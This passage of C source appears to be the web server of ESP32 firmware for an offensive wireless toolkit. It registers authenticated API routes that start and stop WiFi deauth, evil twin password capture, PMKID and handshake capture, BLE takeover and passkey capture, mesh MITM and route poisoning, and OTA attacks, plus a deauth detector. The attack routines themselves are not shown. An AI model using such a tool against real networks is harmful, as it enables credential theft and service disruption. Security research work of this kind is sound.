        cJSON_AddStringToObject(response, "ble_spoof", mode_str);
    }
    if (ble_passkey_is_running()) {
        cJSON_AddStringToObject(response, "ble_passkey", "BLE passkey capture active");
    }
    if (ble_takeover_is_running()) {
        cJSON_AddStringToObject(response, "ble_takeover", "BLE device takeover active");
    }
    if (ota_any_active()) {
        cJSON_AddStringToObject(response, "ota", "OTA attack active");
        cJSON_AddStringToObject(response, "ota_state", "active");
        cJSON_AddNumberToObject(response, "ota_mqtt_msgs", ota_common_get_mqtt_msg_count());
        cJSON_AddNumberToObject(response, "ota_urls", ota_common_get_url_count());
        cJSON_AddNumberToObject(response, "ota_github_urls", ota_common_get_github_url_count());
        cJSON_AddNumberToObject(response, "ota_elapsed", 0);
        cJSON_AddNumberToObject(response, "ota_remaining", 0);
    }
    if (attack_pmkid_is_running()) {
        cJSON_AddStringToObject(response, "pmkid", "PMKID capture active");
    }
    if (attack_handshake_is_running()) {
        cJSON_AddStringToObject(response, "handshake", "Handshake capture active");
    }
    if (attack_eviltwin_is_running()) {
        eviltwin_status_t et_st;
        attack_eviltwin_get_status(&et_st);
        cJSON_AddStringToObject(response, "eviltwin", "Evil Twin active");
        cJSON_AddNumberToObject(response, "eviltwin_captured", et_st.captured_count);
        cJSON_AddNumberToObject(response, "eviltwin_clients", et_st.clients_connected);
    }
    if (deauth_detector_is_running()) {
        cJSON_AddStringToObject(response, "deauth_detect", "Deauth detector active");
        cJSON_AddNumberToObject(response, "deauth_detect_tracked", deauth_detector_get_tracked_count());
        cJSON_AddNumberToObject(response, "deauth_detect_alerts", deauth_detector_get_alert_count());
        cJSON_AddNumberToObject(response, "deauth_detect_total", deauth_detector_get_total_deauths());
    }
    if (is_attack_active()) {
        char target[18];
        get_attack_target(target);
        cJSON_AddStringToObject(response, "target", target);
        if (attack_timer_active) {
            int elapsed = time(NULL) - attack_start_time;
            int remaining = (attack_duration_minutes * 60) - elapsed;
            if (remaining > 0) cJSON_AddNumberToObject(response, "remaining", remaining);
        }
    }
    return send_json_response(req, response);
}

static esp_err_t deauth_detect_status_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    /* Use the full status JSON from attack_deauth_detector */
    cJSON *status = deauth_detector_get_status_json();
    if (!status) {
        cJSON *fallback = cJSON_CreateObject();
        cJSON_AddBoolToObject(fallback, "running", false);
        cJSON_AddStringToObject(fallback, "status", "Idle");
        cJSON_AddNumberToObject(fallback, "tracked_count", 0);
        cJSON_AddNumberToObject(fallback, "alert_count", 0);
        cJSON_AddNumberToObject(fallback, "total_deauths", 0);
        return send_json_response(req, fallback);
    }
    return send_json_response(req, status);
}

static esp_err_t deauth_detect_start_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    ESP_LOGI(TAG, "Starting Deauth Detector");
    deauth_detector_start();
    return send_success_response(req);
}

static esp_err_t deauth_detect_stop_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    ESP_LOGI(TAG, "Stopping Deauth Detector");
    deauth_detector_stop();
    return send_success_response(req);
}

static esp_err_t stop_all_handler(httpd_req_t *req) {
    if (!request_is_authenticated(req)) {
        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
        return ESP_FAIL;
    }

    attack_timer_active = false;
    stop_deauth_attack();
    deauth_detector_stop();
    attack_beacon_spam_stop();
    attack_dos_stop();
    attack_handshake_stop();
    attack_pmkid_stop();
    attack_probe_stop();
    attack_karma_stop();
    attack_csa_stop();
    attack_pmf_stop();
    attack_wps_stop();
    attack_eap_audit_stop();
    attack_bt_spam_stop();
    attack_eviltwin_stop();
    ble_deauth_stop();
    ble_connect_flood_stop();
    ble_l2cap_flood_stop();
    ble_gatt_probe_stop();
    ble_spoof_stop();
    ble_passkey_stop();
    ble_takeover_stop();
    ota_stop_all();
    node_spoof_stop();
    mesh_packet_inject_stop();
    mesh_mitm_stop();
    mesh_dos_stop();
    mesh_eavesdrop_stop();
    mesh_replay_stop();
    mesh_wormhole_stop();
    mesh_l2_deauth_stop();
    mesh_route_poison_stop();
    espnow_attack_stop();

    return send_success_response(req);
}

/* ================================================================== */
/*  SERVER START / STOP                                                */
/* ================================================================== */

void start_web_server(void) {
    /* Guard: don't start if already running */
    if (server_handle != NULL) {
        ESP_LOGW(TAG, "Web server already running, skipping.");
        return;
    }

    /* Log free heap before server start for debugging */
    ESP_LOGI(TAG, "Free heap before httpd_start: internal=%u PSRAM=%u",
             (unsigned)heap_internal_free_bytes(),
             (unsigned)heap_psram_free_bytes());

    httpd_handle_t server = NULL;
    httpd_config_t config = HTTPD_DEFAULT_CONFIG();
    config.lru_purge_enable = true;
    config.max_uri_handlers = 180;
    config.max_open_sockets = 3;         /* Reduced from 4 to save ~2KB */
    config.recv_wait_timeout = 5;
    config.send_wait_timeout = 5;
    config.stack_size = 8192;            /* 4096 causes stack overflow on dashboard serve */
    config.max_resp_headers = 8;         /* Reduced from 16 */
    config.backlog_conn = 3;             /* Reduced from 5 */
    
    if (httpd_start(&server, &config) == ESP_OK) {
        ESP_LOGI(TAG, "Web server started. internal=%u PSRAM=%u",
                 (unsigned)heap_internal_free_bytes(),
                 (unsigned)heap_psram_free_bytes());
        server_handle = server;

        /* Core routes */
        httpd_uri_t root = { .uri = "/", .method = HTTP_GET, .handler = root_handler };
        httpd_register_uri_handler(server, &root);
        httpd_uri_t login_get = { .uri = "/login", .method = HTTP_GET, .handler = login_handler };
        httpd_register_uri_handler(server, &login_get);
        httpd_uri_t login_post = { .uri = "/login", .method = HTTP_POST, .handler = login_post_handler };
        httpd_register_uri_handler(server, &login_post);
        httpd_uri_t dashboard = { .uri = "/dashboard", .method = HTTP_GET, .handler = dashboard_handler };
        httpd_register_uri_handler(server, &dashboard);
        httpd_uri_t logout = { .uri = "/logout", .method = HTTP_GET, .handler = logout_handler };
        httpd_register_uri_handler(server, &logout);

        /* WiFi API */
        httpd_uri_t scan = { .uri = "/api/scan", .method = HTTP_GET, .handler = scan_api_handler };
        httpd_register_uri_handler(server, &scan);
        httpd_uri_t mgmt_ap_get = { .uri = "/api/mgmt-ap", .method = HTTP_GET, .handler = mgmt_ap_get_handler };
        httpd_register_uri_handler(server, &mgmt_ap_get);
        httpd_uri_t mgmt_ap_set = { .uri = "/api/mgmt-ap", .method = HTTP_POST, .handler = mgmt_ap_set_handler };
        httpd_register_uri_handler(server, &mgmt_ap_set);
        httpd_uri_t mgmt_ap_reset = { .uri = "/api/mgmt-ap/reset", .method = HTTP_POST, .handler = mgmt_ap_reset_handler };
        httpd_register_uri_handler(server, &mgmt_ap_reset);
        httpd_uri_t attack = { .uri = "/api/attack", .method = HTTP_POST, .handler = attack_api_handler };
        httpd_register_uri_handler(server, &attack);
        httpd_uri_t stop = { .uri = "/api/stop", .method = HTTP_POST, .handler = stop_api_handler };
        httpd_register_uri_handler(server, &stop);
        httpd_uri_t status = { .uri = "/api/status", .method = HTTP_GET, .handler = status_api_handler };
        httpd_register_uri_handler(server, &status);
        /* Legacy alias — same handler as /api/deauth-detect/status */
        httpd_uri_t deauth_detect_legacy = { .uri = "/api/detector", .method = HTTP_GET, .handler = deauth_detect_status_handler };
        httpd_register_uri_handler(server, &deauth_detect_legacy);
        httpd_uri_t deauth_detect_start = { .uri = "/api/deauth-detect/start", .method = HTTP_POST, .handler = deauth_detect_start_handler };
        httpd_register_uri_handler(server, &deauth_detect_start);
        httpd_uri_t deauth_detect_stop = { .uri = "/api/deauth-detect/stop", .method = HTTP_POST, .handler = deauth_detect_stop_handler };
        httpd_register_uri_handler(server, &deauth_detect_stop);
        httpd_uri_t deauth_detect_status = { .uri = "/api/deauth-detect/status", .method = HTTP_GET, .handler = deauth_detect_status_handler };
        httpd_register_uri_handler(server, &deauth_detect_status);
        httpd_uri_t beacon_start = { .uri = "/api/beacon/start", .method = HTTP_POST, .handler = beacon_start_handler };
        httpd_register_uri_handler(server, &beacon_start);
        httpd_uri_t beacon_stop = { .uri = "/api/beacon/stop", .method = HTTP_POST, .handler = beacon_stop_handler };
        httpd_register_uri_handler(server, &beacon_stop);
        httpd_uri_t beacon_status = { .uri = "/api/beacon/status", .method = HTTP_GET, .handler = beacon_status_handler };
        httpd_register_uri_handler(server, &beacon_status);
        httpd_uri_t dos_start = { .uri = "/api/dos/start", .method = HTTP_POST, .handler = dos_start_handler };
        httpd_register_uri_handler(server, &dos_start);
        httpd_uri_t dos_stop = { .uri = "/api/dos/stop", .method = HTTP_POST, .handler = dos_stop_handler };
        httpd_register_uri_handler(server, &dos_stop);
        httpd_uri_t dos_status = { .uri = "/api/dos/status", .method = HTTP_GET, .handler = dos_status_handler };
        httpd_register_uri_handler(server, &dos_status);

        /* Handshake API */
        httpd_uri_t handshake_start_uri = { .uri = "/api/handshake/start", .method = HTTP_POST, .handler = handshake_start_handler };
        httpd_register_uri_handler(server, &handshake_start_uri);
        httpd_uri_t handshake_stop_uri = { .uri = "/api/handshake/stop", .method = HTTP_POST, .handler = handshake_stop_handler };
        httpd_register_uri_handler(server, &handshake_stop_uri);
        httpd_uri_t handshake_status_uri = { .uri = "/api/handshake/status", .method = HTTP_GET, .handler = handshake_status_handler };
        httpd_register_uri_handler(server, &handshake_status_uri);
        httpd_uri_t handshake_pcap_uri = { .uri = "/api/handshake/pcap", .method = HTTP_GET, .handler = handshake_pcap_handler };
        httpd_register_uri_handler(server, &handshake_pcap_uri);

        /* PMKID API */
        httpd_uri_t pmkid_start_uri = { .uri = "/api/pmkid/start", .method = HTTP_POST, .handler = pmkid_start_handler };
        httpd_register_uri_handler(server, &pmkid_start_uri);
        httpd_uri_t pmkid_stop_uri = { .uri = "/api/pmkid/stop", .method = HTTP_POST, .handler = pmkid_stop_handler };
        httpd_register_uri_handler(server, &pmkid_stop_uri);
        httpd_uri_t pmkid_status_uri = { .uri = "/api/pmkid/status", .method = HTTP_GET, .handler = pmkid_status_handler };
        httpd_register_uri_handler(server, &pmkid_status_uri);
        httpd_uri_t pmkid_hash_uri = { .uri = "/api/pmkid/hash", .method = HTTP_GET, .handler = pmkid_hash_handler };
        httpd_register_uri_handler(server, &pmkid_hash_uri);

        /* Probe Sniffer API */
        httpd_uri_t probe_start = { .uri = "/api/probe/start", .method = HTTP_POST, .handler = probe_start_handler };
        httpd_register_uri_handler(server, &probe_start);
        httpd_uri_t probe_stop = { .uri = "/api/probe/stop", .method = HTTP_POST, .handler = probe_stop_handler };
        httpd_register_uri_handler(server, &probe_stop);
        httpd_uri_t probe_status = { .uri = "/api/probe/status", .method = HTTP_GET, .handler = probe_status_handler };
        httpd_register_uri_handler(server, &probe_status);
        httpd_uri_t probe_ghosts = { .uri = "/api/probe/ghosts", .method = HTTP_GET, .handler = probe_ghosts_handler };
        httpd_register_uri_handler(server, &probe_ghosts);
        httpd_uri_t probe_clear = { .uri = "/api/probe/clear", .method = HTTP_POST, .handler = probe_clear_handler };
        httpd_register_uri_handler(server, &probe_clear);

        /* Evil Twin API */
        httpd_uri_t eviltwin_start = { .uri = "/api/eviltwin/start", .method = HTTP_POST, .handler = eviltwin_start_handler };
        httpd_register_uri_handler(server, &eviltwin_start);
        httpd_uri_t eviltwin_stop = { .uri = "/api/eviltwin/stop", .method = HTTP_POST, .handler = eviltwin_stop_handler };
        httpd_register_uri_handler(server, &eviltwin_stop);
        httpd_uri_t eviltwin_status = { .uri = "/api/eviltwin/status", .method = HTTP_GET, .handler = eviltwin_status_handler };
        httpd_register_uri_handler(server, &eviltwin_status);
        httpd_uri_t eviltwin_passwords = { .uri = "/api/eviltwin/passwords", .method = HTTP_GET, .handler = eviltwin_passwords_handler };
        httpd_register_uri_handler(server, &eviltwin_passwords);
        httpd_uri_t eviltwin_clear = { .uri = "/api/eviltwin/clear", .method = HTTP_POST, .handler = eviltwin_clear_handler };
        httpd_register_uri_handler(server, &eviltwin_clear);

        /* Karma / CSA / PMF / WPS / EAP Audit */
        httpd_uri_t karma_start = { .uri = "/api/karma/start", .method = HTTP_POST, .handler = karma_start_handler };
        httpd_register_uri_handler(server, &karma_start);
        httpd_uri_t karma_stop = { .uri = "/api/karma/stop", .method = HTTP_POST, .handler = karma_stop_handler };
        httpd_register_uri_handler(server, &karma_stop);
        httpd_uri_t karma_status = { .uri = "/api/karma/status", .method = HTTP_GET, .handler = karma_status_handler };
        httpd_register_uri_handler(server, &karma_status);
        httpd_uri_t karma_results = { .uri = "/api/karma/results", .method = HTTP_GET, .handler = karma_results_handler };
        httpd_register_uri_handler(server, &karma_results);
        httpd_uri_t karma_clear = { .uri = "/api/karma/clear", .method = HTTP_POST, .handler = karma_clear_handler };
        httpd_register_uri_handler(server, &karma_clear);

        httpd_uri_t csa_start = { .uri = "/api/csa/start", .method = HTTP_POST, .handler = csa_start_handler };
        httpd_register_uri_handler(server, &csa_start);
        httpd_uri_t csa_stop = { .uri = "/api/csa/stop", .method = HTTP_POST, .handler = csa_stop_handler };
        httpd_register_uri_handler(server, &csa_stop);
        httpd_uri_t csa_status = { .uri = "/api/csa/status", .method = HTTP_GET, .handler = csa_status_handler };
        httpd_register_uri_handler(server, &csa_status);

        httpd_uri_t pmf_start = { .uri = "/api/pmf/start", .method = HTTP_POST, .handler = pmf_start_handler };
        httpd_register_uri_handler(server, &pmf_start);
        httpd_uri_t pmf_stop = { .uri = "/api/pmf/stop", .method = HTTP_POST, .handler = pmf_stop_handler };
        httpd_register_uri_handler(server, &pmf_stop);
        httpd_uri_t pmf_status = { .uri = "/api/pmf/status", .method = HTTP_GET, .handler = pmf_status_handler };
        httpd_register_uri_handler(server, &pmf_status);
        httpd_uri_t pmf_results = { .uri = "/api/pmf/results", .method = HTTP_GET, .handler = pmf_results_handler };
        httpd_register_uri_handler(server, &pmf_results);
        httpd_uri_t pmf_clear = { .uri = "/api/pmf/clear", .method = HTTP_POST, .handler = pmf_clear_handler };
        httpd_register_uri_handler(server, &pmf_clear);

        httpd_uri_t wps_start = { .uri = "/api/wps/start", .method = HTTP_POST, .handler = wps_start_handler };
        httpd_register_uri_handler(server, &wps_start);
        httpd_uri_t wps_stop = { .uri = "/api/wps/stop", .method = HTTP_POST, .handler = wps_stop_handler };
        httpd_register_uri_handler(server, &wps_stop);
        httpd_uri_t wps_status = { .uri = "/api/wps/status", .method = HTTP_GET, .handler = wps_status_handler };
        httpd_register_uri_handler(server, &wps_status);
        httpd_uri_t wps_results = { .uri = "/api/wps/results", .method = HTTP_GET, .handler = wps_results_handler };
        httpd_register_uri_handler(server, &wps_results);
        httpd_uri_t wps_clear = { .uri = "/api/wps/clear", .method = HTTP_POST, .handler = wps_clear_handler };
        httpd_register_uri_handler(server, &wps_clear);

        httpd_uri_t eap_start = { .uri = "/api/eap-audit/start", .method = HTTP_POST, .handler = eap_audit_start_handler };
        httpd_register_uri_handler(server, &eap_start);
        httpd_uri_t eap_stop = { .uri = "/api/eap-audit/stop", .method = HTTP_POST, .handler = eap_audit_stop_handler };
        httpd_register_uri_handler(server, &eap_stop);
        httpd_uri_t eap_status = { .uri = "/api/eap-audit/status", .method = HTTP_GET, .handler = eap_audit_status_handler };
        httpd_register_uri_handler(server, &eap_status);
        httpd_uri_t eap_results = { .uri = "/api/eap-audit/results", .method = HTTP_GET, .handler = eap_audit_results_handler };
        httpd_register_uri_handler(server, &eap_results);
        httpd_uri_t eap_clear = { .uri = "/api/eap-audit/clear", .method = HTTP_POST, .handler = eap_audit_clear_handler };
        httpd_register_uri_handler(server, &eap_clear);

        /* BLE API (shortened for space – same as before) */
        httpd_uri_t ble_scan_uri = { .uri = "/api/ble/scan", .method = HTTP_GET, .handler = ble_scan_api_handler };
        httpd_register_uri_handler(server, &ble_scan_uri);
        httpd_uri_t ble_status_uri = { .uri = "/api/ble/status", .method = HTTP_GET, .handler = ble_status_api_handler };
        httpd_register_uri_handler(server, &ble_status_uri);
        httpd_uri_t ble_spam_start_uri = { .uri = "/api/ble/spam/start", .method = HTTP_POST, .handler = ble_spam_start_handler };
        httpd_register_uri_handler(server, &ble_spam_start_uri);
        httpd_uri_t ble_spam_stop_uri = { .uri = "/api/ble/spam/stop", .method = HTTP_POST, .handler = ble_spam_stop_handler };
        httpd_register_uri_handler(server, &ble_spam_stop_uri);
        httpd_uri_t ble_spam_status_uri = { .uri = "/api/ble/spam/status", .method = HTTP_GET, .handler = ble_spam_status_handler };
        httpd_register_uri_handler(server, &ble_spam_status_uri);
        httpd_uri_t ble_spoof_start_uri = { .uri = "/api/ble/spoof/start", .method = HTTP_POST, .handler = ble_spoof_start_handler };
        httpd_register_uri_handler(server, &ble_spoof_start_uri);
        httpd_uri_t ble_spoof_stop_uri = { .uri = "/api/ble/spoof/stop", .method = HTTP_POST, .handler = ble_spoof_stop_handler };
        httpd_register_uri_handler(server, &ble_spoof_stop_uri);
        httpd_uri_t ble_spoof_status_uri = { .uri = "/api/ble/spoof/status", .method = HTTP_GET, .handler = ble_spoof_status_handler };
        httpd_register_uri_handler(server, &ble_spoof_status_uri);
        httpd_uri_t ble_spoof_clone_uri = { .uri = "/api/ble/spoof/clone", .method = HTTP_POST, .handler = ble_spoof_clone_handler };
        httpd_register_uri_handler(server, &ble_spoof_clone_uri);
        httpd_uri_t ble_connect_start_uri = { .uri = "/api/ble/connect/start", .method = HTTP_POST, .handler = ble_connect_start_handler };
        httpd_register_uri_handler(server, &ble_connect_start_uri);
        httpd_uri_t ble_connect_stop_uri = { .uri = "/api/ble/connect/stop", .method = HTTP_POST, .handler = ble_connect_stop_handler };
        httpd_register_uri_handler(server, &ble_connect_stop_uri);
        httpd_uri_t ble_connect_status_uri = { .uri = "/api/ble/connect/status", .method = HTTP_GET, .handler = ble_connect_status_handler };
        httpd_register_uri_handler(server, &ble_connect_status_uri);
        httpd_uri_t ble_l2cap_start_uri = { .uri = "/api/ble/l2cap/start", .method = HTTP_POST, .handler = ble_l2cap_start_handler };
        httpd_register_uri_handler(server, &ble_l2cap_start_uri);
        httpd_uri_t ble_l2cap_stop_uri = { .uri = "/api/ble/l2cap/stop", .method = HTTP_POST, .handler = ble_l2cap_stop_handler };
        httpd_register_uri_handler(server, &ble_l2cap_stop_uri);
        httpd_uri_t ble_l2cap_status_uri = { .uri = "/api/ble/l2cap/status", .method = HTTP_GET, .handler = ble_l2cap_status_handler };
        httpd_register_uri_handler(server, &ble_l2cap_status_uri);
        httpd_uri_t ble_gatt_start_uri = { .uri = "/api/ble/gatt/start", .method = HTTP_POST, .handler = ble_gatt_start_handler };
        httpd_register_uri_handler(server, &ble_gatt_start_uri);
        httpd_uri_t ble_gatt_stop_uri = { .uri = "/api/ble/gatt/stop", .method = HTTP_POST, .handler = ble_gatt_stop_handler };
        httpd_register_uri_handler(server, &ble_gatt_stop_uri);
        httpd_uri_t ble_gatt_status_uri = { .uri = "/api/ble/gatt/status", .method = HTTP_GET, .handler = ble_gatt_status_handler };
        httpd_register_uri_handler(server, &ble_gatt_status_uri);
        httpd_uri_t ble_deauth_start_uri = { .uri = "/api/ble/deauth/start", .method = HTTP_POST, .handler = ble_deauth_start_handler };
        httpd_register_uri_handler(server, &ble_deauth_start_uri);
        httpd_uri_t ble_deauth_stop_uri = { .uri = "/api/ble/deauth/stop", .method = HTTP_POST, .handler = ble_deauth_stop_handler };
        httpd_register_uri_handler(server, &ble_deauth_stop_uri);
        httpd_uri_t ble_deauth_status_uri = { .uri = "/api/ble/deauth/status", .method = HTTP_GET, .handler = ble_deauth_status_handler };
        httpd_register_uri_handler(server, &ble_deauth_status_uri);
        httpd_uri_t ble_passkey_start_uri = { .uri = "/api/ble/passkey/start", .method = HTTP_POST, .handler = ble_passkey_start_handler };
        httpd_register_uri_handler(server, &ble_passkey_start_uri);
        httpd_uri_t ble_passkey_stop_uri = { .uri = "/api/ble/passkey/stop", .method = HTTP_POST, .handler = ble_passkey_stop_handler };
        httpd_register_uri_handler(server, &ble_passkey_stop_uri);
        httpd_uri_t ble_passkey_status_uri = { .uri = "/api/ble/passkey/status", .method = HTTP_GET, .handler = ble_passkey_status_handler };
        httpd_register_uri_handler(server, &ble_passkey_status_uri);
        httpd_uri_t ble_takeover_start_uri = { .uri = "/api/ble/takeover/start", .method = HTTP_POST, .handler = ble_takeover_start_handler };
        httpd_register_uri_handler(server, &ble_takeover_start_uri);
        httpd_uri_t ble_takeover_stop_uri = { .uri = "/api/ble/takeover/stop", .method = HTTP_POST, .handler = ble_takeover_stop_handler };
        httpd_register_uri_handler(server, &ble_takeover_stop_uri);
        httpd_uri_t ble_takeover_status_uri = { .uri = "/api/ble/takeover/status", .method = HTTP_GET, .handler = ble_takeover_status_handler };
        httpd_register_uri_handler(server, &ble_takeover_status_uri);
        httpd_uri_t ble_takeover_services_uri = { .uri = "/api/ble/takeover/services", .method = HTTP_GET, .handler = ble_takeover_services_handler };
        httpd_register_uri_handler(server, &ble_takeover_services_uri);
        httpd_uri_t ble_takeover_read_uri = { .uri = "/api/ble/takeover/read", .method = HTTP_POST, .handler = ble_takeover_read_handler };
        httpd_register_uri_handler(server, &ble_takeover_read_uri);
        httpd_uri_t ble_takeover_write_uri = { .uri = "/api/ble/takeover/write", .method = HTTP_POST, .handler = ble_takeover_write_handler };
        httpd_register_uri_handler(server, &ble_takeover_write_uri);
        httpd_uri_t ble_takeover_notify_uri = { .uri = "/api/ble/takeover/notify", .method = HTTP_POST, .handler = ble_takeover_notify_handler };
        httpd_register_uri_handler(server, &ble_takeover_notify_uri);
        httpd_uri_t ble_takeover_notifs_uri = { .uri = "/api/ble/takeover/notifs", .method = HTTP_GET, .handler = ble_takeover_notifs_handler };
        httpd_register_uri_handler(server, &ble_takeover_notifs_uri);
        httpd_uri_t stop_all = { .uri = "/api/stop/all", .method = HTTP_POST, .handler = stop_all_handler };
        httpd_register_uri_handler(server, &stop_all);

        /* ── NEW: Mesh Scanner API ── */
        httpd_uri_t mesh_scan_uri = {.uri = "/api/mesh/scan",.method = HTTP_GET,.handler = mesh_scan_api_handler};
        httpd_register_uri_handler(server, &mesh_scan_uri);

        httpd_uri_t mesh_sniff_start_uri = {.uri = "/api/mesh/sniff",.method = HTTP_POST,.handler = mesh_sniff_start_handler};
        httpd_register_uri_handler(server, &mesh_sniff_start_uri);

        httpd_uri_t mesh_sniff_results_uri = {.uri = "/api/mesh/sniff",.method   = HTTP_GET,.handler  = mesh_sniff_results_handler};
        httpd_register_uri_handler(server, &mesh_sniff_results_uri);

        httpd_uri_t mesh_remote_scan_uri = {.uri = "/api/mesh/remote-scan", .method = HTTP_POST,.handler = mesh_remote_scan_handler};
        httpd_register_uri_handler(server, &mesh_remote_scan_uri);

        httpd_uri_t mesh_remote_results_uri = {.uri = "/api/mesh/remote-scan", .method = HTTP_GET,.handler = mesh_remote_results_handler};
        httpd_register_uri_handler(server, &mesh_remote_results_uri);

        /* ── Node Spoof API ── */
        httpd_uri_t spoof_start_uri = {.uri = "/api/spoof/start", .method = HTTP_POST, .handler = spoof_start_handler};
        httpd_register_uri_handler(server, &spoof_start_uri);

        httpd_uri_t spoof_status_uri = {.uri = "/api/spoof/status", .method = HTTP_GET, .handler = spoof_status_handler};
        httpd_register_uri_handler(server, &spoof_status_uri);

        httpd_uri_t spoof_stop_uri = {.uri = "/api/spoof/stop", .method = HTTP_POST, .handler = spoof_stop_handler};
        httpd_register_uri_handler(server, &spoof_stop_uri);

        httpd_uri_t mesh_inject_start_uri = {.uri = "/api/mesh/inject/start", .method = HTTP_POST, .handler = mesh_inject_start_handler};
        httpd_register_uri_handler(server, &mesh_inject_start_uri);

        httpd_uri_t mesh_inject_status_uri = {.uri = "/api/mesh/inject/status", .method = HTTP_GET, .handler = mesh_inject_status_handler};
        httpd_register_uri_handler(server, &mesh_inject_status_uri);

        httpd_uri_t mesh_inject_stop_uri = {.uri = "/api/mesh/inject/stop", .method = HTTP_POST, .handler = mesh_inject_stop_handler};
        httpd_register_uri_handler(server, &mesh_inject_stop_uri);

        httpd_uri_t mesh_mitm_start_uri = {.uri = "/api/mesh/mitm/start", .method = HTTP_POST, .handler = mesh_mitm_start_handler};
        httpd_register_uri_handler(server, &mesh_mitm_start_uri);
        httpd_uri_t mesh_mitm_status_uri = {.uri = "/api/mesh/mitm/status", .method = HTTP_GET, .handler = mesh_mitm_status_handler};
        httpd_register_uri_handler(server, &mesh_mitm_status_uri);
        httpd_uri_t mesh_mitm_stop_uri = {.uri = "/api/mesh/mitm/stop", .method = HTTP_POST, .handler = mesh_mitm_stop_handler};
        httpd_register_uri_handler(server, &mesh_mitm_stop_uri);

        httpd_uri_t mesh_dos_start_uri = {.uri = "/api/mesh/dos/start", .method = HTTP_POST, .handler = mesh_dos_start_handler};
        httpd_register_uri_handler(server, &mesh_dos_start_uri);
        httpd_uri_t mesh_dos_status_uri = {.uri = "/api/mesh/dos/status", .method = HTTP_GET, .handler = mesh_dos_status_handler};
        httpd_register_uri_handler(server, &mesh_dos_status_uri);
        httpd_uri_t mesh_dos_stop_uri = {.uri = "/api/mesh/dos/stop", .method = HTTP_POST, .handler = mesh_dos_stop_handler};
        httpd_register_uri_handler(server, &mesh_dos_stop_uri);

        httpd_uri_t mesh_eaves_start_uri = {.uri = "/api/mesh/eavesdrop/start", .method = HTTP_POST, .handler = mesh_eavesdrop_start_handler};
        httpd_register_uri_handler(server, &mesh_eaves_start_uri);
        httpd_uri_t mesh_eaves_status_uri = {.uri = "/api/mesh/eavesdrop/status", .method = HTTP_GET, .handler = mesh_eavesdrop_status_handler};
        httpd_register_uri_handler(server, &mesh_eaves_status_uri);
        httpd_uri_t mesh_eaves_stop_uri = {.uri = "/api/mesh/eavesdrop/stop", .method = HTTP_POST, .handler = mesh_eavesdrop_stop_handler};
        httpd_register_uri_handler(server, &mesh_eaves_stop_uri);

        httpd_uri_t mesh_replay_start_uri = {.uri = "/api/mesh/replay/start", .method = HTTP_POST, .handler = mesh_replay_start_handler};
        httpd_register_uri_handler(server, &mesh_replay_start_uri);
        httpd_uri_t mesh_replay_status_uri = {.uri = "/api/mesh/replay/status", .method = HTTP_GET, .handler = mesh_replay_status_handler};
        httpd_register_uri_handler(server, &mesh_replay_status_uri);
        httpd_uri_t mesh_replay_stop_uri = {.uri = "/api/mesh/replay/stop", .method = HTTP_POST, .handler = mesh_replay_stop_handler};
        httpd_register_uri_handler(server, &mesh_replay_stop_uri);

        httpd_uri_t mesh_wormhole_start_uri = {.uri = "/api/mesh/wormhole/start", .method = HTTP_POST, .handler = mesh_wormhole_start_handler};
        httpd_register_uri_handler(server, &mesh_wormhole_start_uri);
        httpd_uri_t mesh_wormhole_status_uri = {.uri = "/api/mesh/wormhole/status", .method = HTTP_GET, .handler = mesh_wormhole_status_handler};
        httpd_register_uri_handler(server, &mesh_wormhole_status_uri);
        httpd_uri_t mesh_wormhole_stop_uri = {.uri = "/api/mesh/wormhole/stop", .method = HTTP_POST, .handler = mesh_wormhole_stop_handler};
        httpd_register_uri_handler(server, &mesh_wormhole_stop_uri);

        httpd_uri_t mesh_l2_deauth_start_uri = {.uri = "/api/mesh/l2-deauth/start", .method = HTTP_POST, .handler = mesh_l2_deauth_start_handler};
        httpd_register_uri_handler(server, &mesh_l2_deauth_start_uri);
        httpd_uri_t mesh_l2_deauth_status_uri = {.uri = "/api/mesh/l2-deauth/status", .method = HTTP_GET, .handler = mesh_l2_deauth_status_handler};
        httpd_register_uri_handler(server, &mesh_l2_deauth_status_uri);
        httpd_uri_t mesh_l2_deauth_stop_uri = {.uri = "/api/mesh/l2-deauth/stop", .method = HTTP_POST, .handler = mesh_l2_deauth_stop_handler};
        httpd_register_uri_handler(server, &mesh_l2_deauth_stop_uri);

        httpd_uri_t mesh_route_poison_start_uri = {.uri = "/api/mesh/route-poison/start", .method = HTTP_POST, .handler = mesh_route_poison_start_handler};
        httpd_register_uri_handler(server, &mesh_route_poison_start_uri);
        httpd_uri_t mesh_route_poison_status_uri = {.uri = "/api/mesh/route-poison/status", .method = HTTP_GET, .handler = mesh_route_poison_status_handler};
        httpd_register_uri_handler(server, &mesh_route_poison_status_uri);
        httpd_uri_t mesh_route_poison_stop_uri = {.uri = "/api/mesh/route-poison/stop", .method = HTTP_POST, .handler = mesh_route_poison_stop_handler};
        httpd_register_uri_handler(server, &mesh_route_poison_stop_uri);

        httpd_uri_t espnow_start_uri = {.uri = "/api/mesh/espnow/start", .method = HTTP_POST, .handler = espnow_start_handler};
        httpd_register_uri_handler(server, &espnow_start_uri);
        httpd_uri_t espnow_status_uri = {.uri = "/api/mesh/espnow/status", .method = HTTP_GET, .handler = espnow_status_handler};
        httpd_register_uri_handler(server, &espnow_status_uri);
        httpd_uri_t espnow_stop_uri = {.uri = "/api/mesh/espnow/stop", .method = HTTP_POST, .handler = espnow_stop_handler};
        httpd_register_uri_handler(server, &espnow_stop_uri);

        /* OTA Attack API (per-module + legacy /api/ota/start dispatcher) */
        httpd_uri_t ota_sniff_start_uri = { .uri = "/api/ota/sniff/start", .method = HTTP_POST, .handler = ota_sniff_start_handler };
        httpd_register_uri_handler(server, &ota_sniff_start_uri);
        httpd_uri_t ota_sniff_stop_uri = { .uri = "/api/ota/sniff/stop", .method = HTTP_POST, .handler = ota_stop_handler };
        httpd_register_uri_handler(server, &ota_sniff_stop_uri);
        httpd_uri_t ota_sniff_status_uri = { .uri = "/api/ota/sniff/status", .method = HTTP_GET, .handler = ota_status_handler };
        httpd_register_uri_handler(server, &ota_sniff_status_uri);
